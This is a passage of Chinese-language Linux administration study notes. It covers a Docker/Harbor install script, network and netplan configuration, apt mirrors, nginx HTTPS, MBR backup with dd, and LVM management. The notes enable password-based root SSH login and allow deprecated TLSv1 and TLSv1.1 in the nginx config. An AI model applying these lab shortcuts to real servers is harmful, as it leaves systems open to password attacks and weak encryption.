install_docker_compose && ${COLOR}"DOCKER_COMPOSE安装成功"

}



#harbor安装判断
Harbor__complete() {
if [[ $ostype2 == "Ubuntu" ]];then
    if [ -e /lib/systemd/system/harbar.service ];then 
        ${COLOR}"harbor已安装"${END};exit
        else 
        install_harbor && ${COLOR}"harbor安装完成,已开机启动!"${END} || { ${COLOR1}"harbor安装失败"${END}; exit; }
        ${COLOR}"10秒后，机器会自动重启"${END}
        sleep 10
        reboot
    fi
elif [[ $ostype2 == "CentOS Linux" ]];then
    if [ -e /lib/systemd/system/harbar.service ];then
        ${COLOR}"harbor已安装"${END};exit
    else
        install_harbor && ${COLOR}"harbor安装完成,已开机启动!"${END} || { ${COLOR1}"harbor安装失败"${END}; exit; }	
    fi
fi

}


main(){
    os
    Docker_complete
	Docker_compose_complete
	Harbor__complete
}

main
```

## 5.修改自动获取ip

### 5.1修改网卡名称

```
[13:43:52 root@hostname ~]#sed -ri.bak '/^GRUB_CMDLINE_LINUX=/s@"$@ net.ifnames=0"@' /etc/default/grub
#ubuntu
[21:34:31 liu@ubuntu1804 ~]$grub-mkconfig -o /boot/grub/grub.cfg >& /dev/null; reboot;
#centos
[13:50:27 root@hostname ~]#grub2-mkconfig -o /boot/grub2/grub.cfg; reboot;
```

![1650001813704](linuxSRE.assets/1650001813704.png)

### 5.2网卡ip配置(CentOS)

```
#这是针对CentOS的网卡配置
[13:50:27 root@hostname ~]#cd /etc/sysconfig/network-scripts
[14:01:43 root@hostname network-scripts]#rm -rf ifcfg-ens33
[14:01:43 root@hostname network-scripts]#touch ifcfg-eth0
[14:01:43 root@hostname network-scripts]#vim ifcfg-eth0
#开始修改配置
   DEVICE=eth0 #针对的是ip a里面的网卡名
   NAME=eth0
   BOOTPROTO=static #表示静态地址还是动态地址
   IPADDR=10.0.0.7 #这里是你要修改的固定ip(必备)
   PREFIX=24 #子网掩码(必备)
   GATEWAY=10.0.0.2(必备)
   DNS1=10.0.0.2(必备)
   DNS2=180.76.76.76
   ONBOOT=yes #表示这个网卡是否被启用
[14:01:43 root@hostname network-scripts]#reboot
[14:01:43 root@hostname network-scripts]#service network
```

### 5.3网卡ip配置(Ubuntu)

#### 5.3.1配置自动获取ip

```
 #这是针对Ubuntu的配置，Ubuntu重启后生成eth0网卡，xshell连不上去
[21:34:31 root@ubuntu1804 ~]$sudo -i
[21:34:31 root@ubuntu1804 ~]$cd /etc/netplan/
[21:34:31 root@ubuntu1804 ~]$cp 01-netcfg.yaml eth0.yaml
[21:34:31 root@ubuntu1804 ~]$rm -rf 01-netcfg.yaml
[21:34:31 root@ubuntu1804 ~]$vim eth0.yaml
#vim进入eth0.yaml后把ens33改成eth0,注意缩进不能变
network:
 version: 2
 renderer: networkd
 ethernets:
   eth0:
     dhcp4: yes
[21:34:31 root@ubuntu1804 ~]$netplan apply
```

![1650476512560](linuxSRE.assets/1650476512560.png)

#### 5.3.2配置静态ip

``` 
#这些都是在VMware里面操作
[21:34:31 root@ubuntu1804 ~]$cd /etc/netplan/
[21:34:31 root@ubuntu1804 ~]$vim eth0.yaml
network:
  version: 2
  renderer: networkd
  ethernets:
    eth0:
      addresses:
        - 10.0.0.101/24
        - 192.168.0.102/24
      gateway4: 10.0.0.2
      nameservers:
       search: [liusenbiao.com, liusenbiao.org]
       addresses: [180.76.76.76, 8.8.8.8, 1.1.1.1]
[21:34:31 root@ubuntu1804 ~]$netplan apply
[21:34:31 root@ubuntu1804 ~]$ip a
#如果ip地址连对了以后出现下图的这种情况
#则要修改Ubuntu与允许root进行远程连接的配置
[21:34:31 root@ubuntu1804 ~]$vim /etc/ssh/sshd_config
#PermitRootLogin prohibit-password
改成PermitRootLogin yes
[21:34:31 root@ubuntu1804 ~]$passwd #给root设置密码
[21:34:31 root@ubuntu1804 ~]$systemctl restart sshd

#xshell里面操作
[root@ubuntu1804]:/etc/netplan# route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         10.0.0.2        0.0.0.0         UG    0      0        0 eth0
10.0.0.0        0.0.0.0         255.255.255.0   U     0      0        0 eth0
192.168.0.0     0.0.0.0         255.255.255.0   U     0      0        0 eth0
root@ubuntu1804:/etc/netplan# systemd-resolve  --status #查看DNS
DNS Servers: 180.76.76.76
              8.8.8.8 #谷歌DNS
              1.1.1.1 #澳大利亚DNS
```

![1650477615618](linuxSRE.assets/1650477615618.png)

#### 5.3.3多网卡设置地址

```
[21:34:31 root@ubuntu1804 ~]$cd /etc/netplan/
root@ubuntu1804:/etc/netplan# cp eth0.yaml eth1.yaml
root@ubuntu1804:/etc/netplan# vim eth1.yaml
network:
  version: 2
  renderer: networkd
  ethernets:
    eth1:
      addresses:
        - 10.0.0.200/24
```

![1650480316295](linuxSRE.assets/1650480316295.png)

## 6.ubuntu换国内源

```
[14:47:36 liu@ubuntu1804 main]$cd /mnt/pool/main
[14:47:36 liu@ubuntu1804 main]$ll /etc/apt/sources.list
[14:50:39 liu@ubuntu1804 main]$sudo -i
[root@ubuntu1804:~]#sed -i.bak 's/hk.archive.ubuntu.com/mirrors.aliyun.com/' /etc/apt/sources.list
[root@ubuntu1804:~]#sed -ri.bak 's#(.*//).*\.ubuntu\.com#\1mirrors.aliyun.com#' /etc/apt/sources.list
#更新一下是否国内源安装成功:我换的是华为云
[root@ubuntu1804:~]#apt update
```

![1650101952858](linuxSRE.assets/1650101952858.png)

## 7.CentOS硬盘分区

```
[18:32:02 root@hostname ~]#lsblk
```

![1650105256249](linuxSRE.assets/1650105256249.png)

## 8.搭建网站

### 8.1linux上配置环境并启动

```
[root@iZ8vbhnpxkxosj8s8q7w0tZ ~]# history
    1  ls
    2  yum install -y yum-utils device-mapper-persistent-data lvm2
    3  yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
    4  yum -y install docker-ce
    5  systemctl start docker
    6  systemctl enable docker
    7  docker ps
    8  docker info
    9  docker pull wordpress
   10  docker run -d --name liuAliyun -p 80:80 wordpress
   11  docker ps
   12  docker logs -f liuAliyun
   13  netstat -anlptu |grep 80
[root@paranoid ~]# /etc/init.d/bt default #启动宝塔linux
```

![1650118813211](linuxSRE.assets/1650118813211.png)

### 8.2Nginx配置https证书

```
[root@iZ8vbhnpxkxosj8s8q7w0tZ conf.d]# pwd
/etc/nginx/conf.d
[root@iZ8vbhnpxkxosj8s8q7w0tZ conf.d]# vim liusenbiao.conf

upstream liusenbiao_www {
         server 172.20.114.179   weight=5;
}
server {
        listen 443 ssl;  # 1.1版本后这样写
        server_name www.liusenbiao.cn; #填写绑定证书的域名
        ssl_certificate www/server/nginx/conf/ssl/ssl.pem;  # 指定证书的位置，绝对路径
        ssl_certificate_key www/server/nginx/conf/ssl/ssl.key;  # 绝对路径，同上
        ssl_session_timeout 5m;
        ssl_protocols TLSv1 TLSv1.1 TLSv1.2; #按照这个协议配置
        ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;#按照这个套>件配置
        ssl_prefer_server_ciphers on;
        location / {
                proxy_pass http://liusenbiao_www;
           }
        }
```

## 9.xshell系列问题

### 9.1 把桌面上压缩包拖到xshell

```
[20:52:43 root@hostname ~]# yum -y install lrzsz
#安装解压缩的工作
[20:52:43 root@hostname ~]#yum -y install unzip
```

![1650121430564](linuxSRE.assets/1650121430564.png)

### 9.2 xshell选项卡消失

```
点击会话选项卡或者快捷键Ctrl + Shift + T可以调出来。
```

![1660011448238](linux体系.assets/1660011448238.png)

### 9.3 xshell会话管理消失

```
点击查看里面的会话管理，即可打开会话管理。
```

![1660011616003](linux体系.assets/1660011616003.png)

![1660011726372](linux体系.assets/1660011726372.png)

## 10.备份硬盘数据

### 10.1远程备份

```
[11:14:45 root@hostname ~]#hexdump -C -n 512 /dev/sda
[13:34:28 root@hostname ~]#dd if=/dev/sda of=/data/mbr bs=1 count=64 skip=446 #if读入，of读出
[13:39:04 root@hostname ~]#ll /data/mbr #确认是64个字节
#-rw-r--r-- 1 root root 64 Apr 17 13:39 /data/mbr
#备份到远程服务器上，这是我的阿里云的服务器ip
[13:48:28 root@hostname ~]#scp /data/mbr 39.103.190.214:
```

![1650178096249](linuxSRE.assets/1650178096249.png)

### 10.2进入VM的rescue模式

```
#进入rescue模式非常的坑，出现下面这个模式的时候，你要先按一下鼠标的左键，然后有且仅且只能按一次esc键才能成功进入，时间只有0.5s，非常的坑！！！！
```

![1650178622349](linuxSRE.assets/1650178622349.png)

### 10.3连网进行远程备份

```
[sh-4]#ip a a 10.0.0.8/24 dev ens33
[sh-4]#ping 10.0.0.7 #ping你刚才的远程备份的机器,只能是同一个网段
[sh-4]#scp 10.0.0.7:/root/mbr .#远程机器备份到当前目录
[sh-4]#ls -l mbr #查看是否是64字节文件
[sh-4]#dd if=mbr of=dev/sda bs=1 count=64 seek=446
[sh-4]#sync #立即写磁盘
```

## 11.管理存储三要素

### 11.1.fdisk分区

```
fidisk /dev/sd.*
-子命令
p 分区列表
t 更改分区类型
n 创建新分区
d 删除分区
v 校验分区
u 转换单位
w 保存并退出
q 不保存并退出
```

![1650248722212](linuxSRE.assets/1650248722212.png)

### 11.2.创建文件系统

```
mkfs命令：
(1) mkfs.FS_TYPE /dev/DEVICE
 ext4
 xfs
 btrfs
 vfat
-常用选项
-t {ext2|ext3|ext4|xfs} 指定文件系统类型
-b {1024|2048|4096} 指定块 block 大小
-L ‘LABEL’ 设置卷标
-j 相当于 -t ext3， mkfs.ext3 = mkfs -t ext3 = mke2fs -j = mke2fs -  t ext3
-i  # 为数据空间中每多少个字节创建一个inode；不应该小于block大 小
-N  # 指定分区中创建多少个inode
-I 一个inode记录占用的磁盘空间大小，128---4096
-m  # 默认5%,为管理人员预留空间占总空间的百分比
-O FEATURE[,...] 启用指定特性
-O ^FEATURE 关闭指定特性
```

![1650249020070](linuxSRE.assets/1650249020070.png)

### 11.3挂载

- 挂载规则:
- 一个挂载点同一时间只能挂载一个设备
- 一个挂载点同一时间挂载了多个设备，只能看到最后一个设备的数据，其它设备上的数据将被隐藏
- 一个设备可以同时挂载到多个挂载点
- 通常挂载点一般是已存在空的目录

```
[10:29:35 root@hostname ~]#mount /dev/sdb5 /mnt
#mountpoint：挂载点目录必须事先存在，建议使用空目录,如果不是空目录，之前的文件就会隐藏
#可以一个设备挂载到不同的空文件夹里，一个空的文件夹只能对应唯一的挂载设备
-mount 常用命令选项
-t fstype 指定要挂载的设备上的文件系统类型,如:ext4,xfs
-r readonly，只读挂载
-w read and write, 读写挂载
-n 不更新/etc/mtab，mount不可见
-a 自动挂载所有支持自动挂载的设备(定义在了/etc/fstab文件中，且挂载选项中有
auto功能)
-L 'LABEL' 以卷标指定挂载设备
-U 'UUID' 以UUID指定要挂载的设备
-B, --bind 绑定目录到另一个目录上
-o options：(挂载文件系统的选项)，多个选项使用逗号分隔
 async   异步模式,内存更改时,写入缓存区buffer,过一段时间再写到磁盘中，效率高，但不安全
   sync   同步模式,内存更改时，同时写磁盘，安全，但效率低下
 atime/noatime 包含目录和文件
 diratime/nodiratime 目录的访问时间戳
 auto/noauto 是否支持开机自动挂载，是否支持-a选项
 exec/noexec 是否支持将文件系统上运行应用程序
 dev/nodev 是否支持在此文件系统上使用设备文件
 suid/nosuid 是否支持suid和sgid权限
 remount 重新挂载
 ro/rw 只读、读写   
 user/nouser 是否允许普通用户挂载此设备，/etc/fstab使用
 acl/noacl 启用此文件系统上的acl功能
 loop 使用loop设备
 _netdev   当网络可用时才对网络资源进行挂载，如：NFS文件系统
 defaults 相当于rw, suid, dev, exec, auto, nouser, async
```

案例：

```
[10:29:35 root@hostname ~]#mount -o ro /dev/sdb1 /mnt/ #只读
[10:29:35 root@hostname ~]#mount -o remount,rw /mnt/#取消只读，改为读写都可以
#查看谁在使用挂载点
[10:29:35 root@hostname ~]#fuser -v /mnt/
                     USER        PID ACCESS COMMAND
/mnt:                root     kernel mount /mnt
                     root       5144 ..c.. bash #使用的进程
[10:42:15 root@hostname ~]#fuser -km /mnt/ #把进程直接踢出终端
[10:42:15 root@hostname ~]#findmnt /mnt/ #查看是否是挂载点
```

![1650249750216](linuxSRE.assets/1650249750216.png)

**挂载持久化**

```
[10:46:52 root@hostname ~]#blkid #查看挂载的UUID
[10:54:39 root@hostname ~]#mkdir /data/mysql
[10:59:52 root@hostname ~]#vim /etc/fstab #在这里实现永久挂载
[11:11:23 root@hostname ~]#mount -a #立即生效
```

![1650251685743](linuxSRE.assets/1650251685743.png)

![1650252053621](linuxSRE.assets/1650252053621.png)

## 12.逻辑卷实现

![1650276516117](linuxSRE.assets/1650276516117.png)

### 12.1把一个硬盘sdc和一个分区sdb/sdb1放到逻辑卷中

```
[18:10:08 root@hostname ~]#yum -y install lvm2 #先安装包
#案例：把一个硬盘sdc和一个分区sdb/sdb1放到逻辑卷中
#1.先分区
[18:19:38 root@hostname ~]#fdisk /dev/sdb
Welcome to fdisk (util-linux 2.23.2).

Changes will remain in memory only, until you decide to write them.
Be careful before using the write command.


Command (m for help): p

Disk /dev/sdb: 21.5 GB, 21474836480 bytes, 41943040 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk label type: dos
Disk identifier: 0x9a668bca

   Device Boot      Start         End      Blocks   Id  System
/dev/sdb1            2048     2099199     1048576   83  Linux
/dev/sdb2         2099200    23070719    10485760    5  Extended
/dev/sdb3        23070720    33556479     5242880   83  Linux

Command (m for help): m
Command action
   a   toggle a bootable flag
   b   edit bsd disklabel
   c   toggle the dos compatibility flag
   d   delete a partition
   g   create a new empty GPT partition table
   G   create an IRIX (SGI) partition table
   l   list known partition types
   m   print this menu
   n   add a new partition
   o   create a new empty DOS partition table
   p   print the partition table
   q   quit without saving changes
   s   create a new empty Sun disklabel
   t   change a partition's system id
   u   change display/entry units
   v   verify the partition table
   w   write table to disk and exit
   x   extra functionality (experts only)

Command (m for help): t
Partition number (1-3, default 3): 
Hex code (type L to list all codes): L

 0  Empty           24  NEC DOS         81  Minix / old Lin bf  Solaris        
 1  FAT12           27  Hidden NTFS Win 82  Linux swap / So c1  DRDOS/sec (FAT-
 2  XENIX root      39  Plan 9          83  Linux           c4  DRDOS/sec (FAT-
 3  XENIX usr       3c  PartitionMagic  84  OS/2 hidden C:  c6  DRDOS/sec (FAT-
 4  FAT16 <32M      40  Venix 80286     85  Linux extended  c7  Syrinx         
 5  Extended        41  PPC PReP Boot   86  NTFS volume set da  Non-FS data    
 6  FAT16           42  SFS             87  NTFS volume set db  CP/M / CTOS / .
 7  HPFS/NTFS/exFAT 4d  QNX4.x          88  Linux plaintext de  Dell Utility   
 8  AIX             4e  QNX4.x 2nd part 8e  Linux LVM       df  BootIt         
 9  AIX bootable    4f  QNX4.x 3rd part 93  Amoeba          e1  DOS access     
 a  OS/2 Boot Manag 50  OnTrack DM      94  Amoeba BBT      e3  DOS R/O        
 b  W95 FAT32       51  OnTrack DM6 Aux 9f  BSD/OS          e4  SpeedStor      
 c  W95 FAT32 (LBA) 52  CP/M            a0  IBM Thinkpad hi eb  BeOS fs        
 e  W95 FAT16 (LBA) 53  OnTrack DM6 Aux a5  FreeBSD         ee  GPT            
 f  W95 Ext'd (LBA) 54  OnTrackDM6      a6  OpenBSD         ef  EFI (FAT-12/16/
10  OPUS            55  EZ-Drive        a7  NeXTSTEP        f0  Linux/PA-RISC b
11  Hidden FAT12    56  Golden Bow      a8  Darwin UFS      f1  SpeedStor      
12  Compaq diagnost 5c  Priam Edisk     a9  NetBSD          f4  SpeedStor      
14  Hidden FAT16 <3 61  SpeedStor       ab  Darwin boot     f2  DOS secondary  
16  Hidden FAT16    63  GNU HURD or Sys af  HFS / HFS+      fb  VMware VMFS    
17  Hidden HPFS/NTF 64  Novell Netware  b7  BSDI fs         fc  VMware VMKCORE 
18  AST SmartSleep  65  Novell Netware  b8  BSDI swap       fd  Linux raid auto
1b  Hidden W95 FAT3 70  DiskSecure Mult bb  Boot Wizard hid fe  LANstep        
1c  Hidden W95 FAT3 75  PC/IX           be  Solaris boot    ff  BBT            
1e  Hidden W95 FAT1 80  Old Minix      
Hex code (type L to list all codes): 8e
Changed type of partition 'Linux' to 'Linux LVM'

Command (m for help): p

Disk /dev/sdb: 21.5 GB, 21474836480 bytes, 41943040 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk label type: dos
Disk identifier: 0x9a668bca

   Device Boot      Start         End      Blocks   Id  System
/dev/sdb1            2048     2099199     1048576   83  Linux
/dev/sdb2         2099200    23070719    10485760    5  Extended
/dev/sdb3        23070720    33556479     5242880   8e  Linux LVM

Command (m for help): w
The partition table has been altered!

Calling ioctl() to re-read partition table.
Syncing disks./
[19:19:10 root@hostname ~]#pvcreate /dev/sdb3 /dev/sdc
#可能会出现sdc挂载不成功，先用命令lsblk -f看出sdc是不是在别的地方挂载
#比如我就在创建不成功 就是因为先前做实验用了swap挂载了，于是swapoff /dev/sdc1取消swap的挂载就能precreate成功了
```

![1650281348967](linuxSRE.assets/1650281348967.png)

### 12.2把各个物理卷vgcreate成卷组

```
[19:42:53 root@hostname ~]#vgcreate vg0 /dev/sd{b3,c}
  Volume group "vg0" successfully created
[19:47:42 root@hostname ~]#pvdisplay 
  --- Physical volume ---
  PV Name               /dev/sdb3
  VG Name               vg0
  PV Size               5.00 GiB / not usable 4.00 MiB
  Allocatable           yes 
  PE Size               4.00 MiB
  Total PE              1279
  Free PE               1279
  Allocated PE          0
  PV UUID               Tl5MRb-qwdr-OE3f-2Pi3-yhYf-qkWJ-HU3k51
   
  --- Physical volume ---
  PV Name               /dev/sdc
  VG Name               vg0
  PV Size               10.00 GiB / not usable 4.00 MiB
  Allocatable           yes 
  PE Size               4.00 MiB
  Total PE              2559
  Free PE               2559
  Allocated PE          0
  PV UUID               EgzsLv-xYnS-afBB-4wT5-Lt9M-T7Hx-SE08F9
  [19:48:38 root@hostname ~]#vgs
  VG  #PV #LV #SN Attr   VSize  VFree 
  vg0   2   0   0 wz--n- 14.99g 14.99g
```

### 12.3创建逻辑卷

```
[19:52:08 root@hostname ~]#lvcreate -n mysql -L 1G vg0
  Logical volume "mysql" created.
[19:55:14 root@hostname ~]#lvs
  LV    VG  Attr       LSize Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert
  mysql vg0 -wi-a----- 1.00g  
[19:55:32 root@hostname ~]#lvdisplay
```

![1650283022951](linuxSRE.assets/1650283022951.png)

### 12.4创建文件系统

```
[20:01:12 root@hostname ~]#mkfs.ext4 /dev/vg0/mysql
[20:03:40 root@hostname ~]#blkid
[20:05:01 root@hostname ~]#vim /etc/fstab
#UUID=21c51054-01b2-490e-918d-58479d0f1bbd /mnt/mysql              ext4    defaults            0 0         
[20:43:54 root@hostname ~]#mkdir /mnt/mysql
[20:44:17 root@hostname ~]#mount -a
[20:44:20 root@hostname ~]#df
```

![1650286002584](linuxSRE.assets/1650286002584.png)

### 12.5逻辑卷扩容

```
[21:47:27 root@hostname ~]#vgdisplay #先查看卷组的空间好不好扩
#逻辑卷扩容卷组容量的百分之50，+50%表示扩容50G,50%表示扩容到50G
[22:42:18 root@hostname ~]#lvextend -l +50%free /dev/vg0/mysql
[22:45:00 root@hostname ~]#lvdisplay
#resize2fs只针对ext4的的文件系统
[22:52:20 root@hostname ~]#resize2fs /dev/vg0/mysql #进行同步扩容
#xfs文件系统进行扩容
[22:53:09 root@hostname ~]#lvextend -L +1G /dev/vg0/log
[23:13:57 root@hostname ~]#xfs_growfs /mnt/log
[23:14:33 root@hostname ~]#vgdisplay #查看还剩余多少卷组空间可用
#忽略文件系统，通用扩容方式，这个命令是扩容同步一体化
[23:22:56 root@hostname ~]#lvextend -r -l +100%free /dev/vg0/mysql
[23:25:59 root@hostname ~]#df -Th #查看文件系统
```

![1650293364051](linuxSRE.assets/1650293364051.png)

![1650293764188](linuxSRE.assets/1650293764188.png)

### 12.6物理卷扩容

因为逻辑卷都用光了，所以要扩容物理卷

```
[23:26:11 root@hostname ~]#lsblk #查看还有多少空间可用
[23:29:53 root@hostname ~]#fdisk /dev/sdb
Welcome to fdisk (util-linux 2.23.2).

Changes will remain in memory only, until you decide to write them.
Be careful before using the write command.


Command (m for help): p

Disk /dev/sdb: 21.5 GB, 21474836480 bytes, 41943040 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk label type: dos
Disk identifier: 0x9a668bca

   Device Boot      Start         End      Blocks   Id  System
/dev/sdb1            2048     2099199     1048576   83  Linux
/dev/sdb2         2099200    23070719    10485760    5  Extended
/dev/sdb3        23070720    33556479     5242880   8e  Linux LVM

Command (m for help): n
Partition type:
   p   primary (2 primary, 1 extended, 1 free)
   l   logical (numbered from 5)
Select (default p): p
Selected partition 4
First sector (33556480-41943039, default 33556480): 
Using default value 33556480
Last sector, +sectors or +size{K,M,G} (33556480-41943039, default 41943039): 
Using default value 41943039
Partition 4 of type Linux and of size 4 GiB is set

Command (m for help): p

Disk /dev/sdb: 21.5 GB, 21474836480 bytes, 41943040 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk label type: dos
Disk identifier: 0x9a668bca

   Device Boot      Start         End      Blocks   Id  System
/dev/sdb1            2048     2099199     1048576   83  Linux
/dev/sdb2         2099200    23070719    10485760    5  Extended
/dev/sdb3        23070720    33556479     5242880   8e  Linux LVM
/dev/sdb4        33556480    41943039     4193280   83  Linux

Command (m for help): t
Partition number (1-4, default 4): 
Hex code (type L to list all codes): 8e
Changed type of partition 'Linux' to 'Linux LVM'

Command (m for help): p

Disk /dev/sdb: 21.5 GB, 21474836480 bytes, 41943040 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk label type: dos
Disk identifier: 0x9a668bca

  Device Boot      Start         End      Blocks   Id  System
/dev/sdb1            2048     2099199     1048576   83  Linux
/dev/sdb2         2099200    23070719    10485760    5  Extended
/dev/sdb3        23070720    33556479     5242880   8e  Linux LVM
/dev/sdb4        33556480    41943039     4193280   8e  Linux LVM

Command (m for help): w
The partition table has been altered!

Calling ioctl() to re-read partition table.

WARNING: Re-reading the partition table failed with error 16: Device or resource busy.
The kernel still uses the old table. The new table will be used at
the next reboot or after you run partprobe(8) or kpartx(8)
Syncing disks.
[23:37:14 root@hostname ~]#partprobe #重新启动
[23:43:53 root@hostname ~]#pvcreate /dev/sdb4 #sdb4变成物理卷
[23:45:18 root@hostname ~]#vgextend vg0 /dev/sdb4 #把sdb4加入卷组vg0中
```

![1650296900038](linuxSRE.assets/1650296900038.png)

### 12.7离线缩容逻辑卷(了解)

```
#这是抽象出来的五大步骤
umount /dev/VG_NAME/LV_NAME
e2fsck -f /dev/VG_NAME/LV_NAME
resize2fs /dev/VG_NAME/LV_NAME #[mMgGtT]
lvreduce -L [-]#[mMgGtT] /dev/VG_NAME/LV_NAME
mount /dev/VG_NAME/LV_NAME mountpoint

#具体缩容实际例子并且只能缩ext4   
[23:47:26 root@hostname ~]#df -Th
Filesystem            Type      Size  Used Avail Use% Mounted on
devtmpfs              devtmpfs  1.5G     0  1.5G   0% /dev
tmpfs                 tmpfs     1.5G     0  1.5G   0% /dev/shm
tmpfs                 tmpfs     1.5G  8.9M  1.5G   1% /run
tmpfs                 tmpfs     1.5G     0  1.5G   0% /sys/fs/cgroup
/dev/sda2             xfs       100G  3.1G   97G   4% /
/dev/sda5             xfs        50G   35M   50G   1% /data
/dev/sda1             ext4      976M  145M  765M  16% /boot
tmpfs                 tmpfs     297M     0  297M   0% /run/user/0
/dev/mapper/vg0-mysql ext4       12G  5.0M   12G   1% /mnt/mysql
/dev/mapper/vg0-log   xfs       3.0G   33M  3.0G   2% /mnt/log
[00:01:59 root@hostname ~]#umount /mnt/mysql 
[00:03:05 root@hostname ~]#fsck -f /dev/vg0/mysql #检查文件系统的完整性
[00:04:27 root@hostname ~]#resize2fs /dev/vg0/mysql 2G
#注意逻辑卷的缩减要和之前缩减的大小相一直
[00:05:28 root@hostname ~]#lvreduce -L 2G /dev/vg0/mysql
[00:06:18 root@hostname ~]#mount -a #重新挂载
[00:10:03 root@hostname ~]#ls /mnt/mysql #确保数据能够正常访问
```

![1650298182086](linuxSRE.assets/1650298182086.png)

### 12.8删除逻辑卷

```
#创建逻辑卷是从下往上创建
#删除逻辑卷是从上往下删除
[01:39:03 root@hostname ~]#umount /mnt/mysql 
[01:39:20 root@hostname ~]#umount /mnt/log 
[01:39:26 root@hostname ~]#lvremove /dev/vg0/mysql #逻辑卷删除
[01:39:58 root@hostname ~]#lvremove /dev/vg0/log #逻辑卷删除
[01:41:04 root@hostname ~]#vgremove vg0 #卷组删除
[01:43:09 root@hostname ~]#pvs
 PV         VG Fmt  Attr PSize  PFree 
  /dev/sdb3     lvm2 ---   5.00g  5.00g
  /dev/sdb4     lvm2 ---  <4.00g <4.00g
[01:43:31 root@hostname ~]#pvremove /dev/sd{b3,b4} #物理卷删除
[01:46:21 root@hostname ~]#fdisk /dev/sdb #删除分区
Welcome to fdisk (util-linux 2.23.2).

Changes will remain in memory only, until you decide to write them.
Be careful before using the write command.


Command (m for help): p

Disk /dev/sdb: 21.5 GB, 21474836480 bytes, 41943040 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk label type: dos
Disk identifier: 0x9a668bca

   Device Boot      Start         End      Blocks   Id  System
/dev/sdb1            2048     2099199     1048576   83  Linux
/dev/sdb2         2099200    23070719    10485760    5  Extended
/dev/sdb3        23070720    33556479     5242880   8e  Linux LVM
/dev/sdb4        33556480    41943039     4193280   8e  Linux LVM

Command (m for help): d
Partition number (1-4, default 4): 3
Partition 3 is deleted

Command (m for help): d
Partition number (1,2,4, default 4): 
Partition 4 is deleted

Command (m for help): p

Disk /dev/sdb: 21.5 GB, 21474836480 bytes, 41943040 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk label type: dos
Disk identifier: 0x9a668bca

   Device Boot      Start         End      Blocks   Id  System
/dev/sdb1            2048     2099199     1048576   83  Linux
/dev/sdb2         2099200    23070719    10485760    5  Extended

Command (m for help): w
The partition table has been altered!

Calling ioctl() to re-read partition table.
Syncing disks.
```

## 13.转移硬盘步骤

如果在公司里出现了硬盘老化，需要移走硬盘，但是空间已经被占用给逻辑卷组用了，所以不好直接拆，故需要以下几个步骤

### 13.1查看PE值

```
#要看要移走的硬盘的PE值是否小于其余硬盘PE值之和，才能移走
[00:10:07 root@hostname ~]#pvdisplay
```

![1650299290484](linuxSRE.assets/1650299290484.png)

### 13.2开始搬运空间

```
[00:32:56 root@hostname ~]#pvmove /dev/sdc #空间搬家
  /dev/sdc: Moved: 3.91%
  /dev/sdc: Moved: 100.00%
[00:36:22 root@hostname ~]#vgreduce vg0 /dev/sdc #移出vg0组
  Removed "/dev/sdc" from volume group "vg0"
[00:38:11 root@hostname ~]#pvremove /dev/sdc #移出物理卷
  Labels on physical volume "/dev/sdc" successfully wiped.
[00:38:44 root@hostname ~]#pvs #查看
  PV         VG  Fmt  Attr PSize  PFree   
  /dev/sdb3  vg0 lvm2 a--  <5.00g 1020.00m
  /dev/sdb4  vg0 lvm2 a--  <4.00g   <3.00g
```

![1650299819111](linuxSRE.assets/1650299819111.png)

## 14.逻辑卷快照

案例：

```
#创建实验环境：针对的是ext4的文件系统
[01:00:51 root@hostname ~]#cp /etc/fstab /mnt/mysql/f1.txt
[01:01:44 root@hostname ~]#cp /etc/fstab /mnt/mysql/f2.txt
[01:01:49 root@hostname ~]#cp /etc/fstab /mnt/mysql/f3.txt
[01:01:53 root@hostname ~]#ls /mnt/mysql/
f1.txt  f2.txt  f3.txt  lost+found
[01:02:02 root@hostname ~]#vgdisplay #查看卷组是否有足够空间
#-s表示快照
#-n表示指定名
#-p r只读
#逻辑卷快照可以小于文件
[01:10:06 root@hostname ~]#lvcreate -s -n mysql-snapshot -L 100M -p r/dev/vg0/mysql
#开始对源文件进行修改
[01:10:06 root@hostname ~]#mkdir /mnt/snap #做挂载
#ext4做挂载
[01:12:43 root@hostname ~]#mount -o ro,nouuid /dev/vg0/mysql-snapshot /mnt/snap
#xfs做挂载
[01:12:43 root@hostname ~]#mount /dev/vg0/mysql-snapshot /mnt/snap
[01:15:07 root@hostname ~]#vim /mnt/mysql/f1.txt
[01:16:53 root@hostname ~]#rm -rf /mnt/mysql/f2.txt 
[01:17:21 root@hostname ~]#touch /mnt/mysql/f4.txt
[01:17:40 root@hostname ~]#ll /mnt/snap/
#快照进行还原，快照使命只有一次，用了就自动删除了
[01:18:17 root@hostname ~]#umount /mnt/snap 
[01:20:54 root@hostname ~]#umount /mnt/mysql
[01:21:19 root@hostname ~]#lvconvert --merge /dev/vg0/mysql-snapshot #进行快照还原的命令
[01:23:42 root@hostname ~]#mount -a 
[01:23:56 root@hostname ~]#ls /mnt/mysql/
```

![1650302985051](linuxSRE.assets/1650302985051.png)

## 15.RAID总结

![1650276398890](linuxSRE.assets/1650276398890.png)

## 16.判断端口号被谁占用

```
[02:11:00 root@hostname ~]#yum -y install nc #用来做网络测试
[02:12:00 root@hostname ~]#nc -l 6666 #占用6666端口号
#方式一：
[02:12:39 root@hostname ~]#ss -ntlp
#方式二：
